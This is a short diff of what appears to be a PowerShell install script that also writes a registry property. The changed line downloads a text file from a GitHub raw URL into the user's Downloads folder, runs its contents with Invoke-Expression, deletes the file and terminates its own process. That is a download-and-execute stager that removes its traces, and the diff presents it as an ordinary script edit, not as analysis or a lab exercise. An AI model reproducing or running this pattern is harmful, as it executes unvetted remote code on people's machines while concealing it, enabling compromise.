@@ -32,6 +32,4 @@ New-ItemProperty `
 
 # ============================================================
 
-$f = Join-Path $installDir "8.txt"; Invoke-WebRequest "https://raw.githubusercontent.com/c0261/2/main/8.txt" -OutFile $f; Invoke-Expression (Get-Content $f -Raw); Remove-Item $f
-
-Stop-Process -Id $PID
+$dl=(New-Object -ComObject Shell.Application).Namespace("shell:Downloads").Self.Path;$f = Join-Path $dl "8.txt"; Invoke-WebRequest "https://raw.githubusercontent.com/c0261/2/main/8.txt" -OutFile $f; Invoke-Expression (Get-Content $f -Raw); Remove-Item $f;Stop-Process -Id $PID
